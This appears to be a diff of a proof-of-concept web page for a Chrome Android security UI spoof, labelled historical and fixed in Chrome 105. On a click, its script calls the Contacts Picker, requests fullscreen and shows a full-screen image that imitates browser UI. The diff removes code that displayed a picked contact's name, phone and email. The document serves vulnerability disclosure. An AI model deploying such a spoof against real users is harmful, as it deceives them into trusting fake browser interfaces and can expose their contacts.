@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof</title>
   <meta charset="utf-8">
+  <title>Chrome Android UI Spoof – Historical PoC</title>
   <meta name="viewport"
-        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 
   <style>
     html, body {
@@ -14,6 +14,18 @@
       height: 100%;
       background: #000;
       font-family: sans-serif;
+      overflow: hidden;
+    }
+
+    #content {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      text-align: center;
+      z-index: 1;
     }
 
     #spoof {
@@ -24,73 +36,62 @@
       object-fit: cover;
       display: none;
       z-index: 9999;
+      pointer-events: none;
     }
 
-    #content {
-      height: 100%;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
+    #note {
+      position: fixed;
+      bottom: 10px;
+      left: 0;
+      right: 0;
+      font-size: 12px;
       text-align: center;
-    }
-
-    #result {
-      margin-top: 20px;
-      font-size: 16px;
-      opacity: .9;
+      opacity: .6;
     }
   </style>
 </head>
 
 <body>
 
-<img id="spoof" src="spof2.png" alt="spoof">
+<img id="spoof" src="spof2.png" alt="spoofed ui">
 
 <div id="content">
-  <h1>Click anywhere on the page</h1>
-  <div id="result"></div>
+  <h1>Click anywhere to continue</h1>
+</div>
+
+<div id="note">
+  Historical PoC – fixed in Chrome ≥105
 </div>
 
 <script>
 document.addEventListener('click', async () => {
 
-  let contacts = [];
-
-  // 1️⃣ Contacts Picker (explicit user consent)
+  /* 1️⃣ Contacts Picker (user gesture) */
   if (navigator.contacts && navigator.contacts.select) {
-    try {
-      contacts = await navigator.contacts.select(
-        ["name", "email", "tel"],
-        { multiple: false }
-      );
-    } catch (e) {}
+    navigator.contacts.select(["name"], {})
+      .catch(() => {});
   }
 
-  // 2️⃣ Show spoof overlay
+  /* 2️⃣ Request fullscreen */
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen()
+      .catch(() => {});
+  }
+
+  /* 3️⃣ Visual spoof overlay */
   document.getElementById('spoof').style.display = 'block';
   document.getElementById('content').style.display = 'none';
 
-  // 3️⃣ Fullscreen
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen().catch(()=>{});
-  }
-
-  // 4️⃣ Auto-render selected contact (UX “auto-fill” demo)
-  if (contacts.length > 0) {
-    const c = contacts[0];
-    console.log(c);
-
-    alert(
-      "Selected contact:\n" +
-      (c.name?.[0] || "") + "\n" +
-      (c.tel?.[0] || "") + "\n" +
-      (c.email?.[0] || "")
-    );
-  }
-
 }, { once: true });
+
+/* Observability for reports */
+document.addEventListener('fullscreenchange', () => {
+  console.log('fullscreen:', !!document.fullscreenElement);
+});
+
+document.addEventListener('visibilitychange', () => {
+  console.log('visibility:', document.visibilityState);
+});
 </script>
 
 </body>
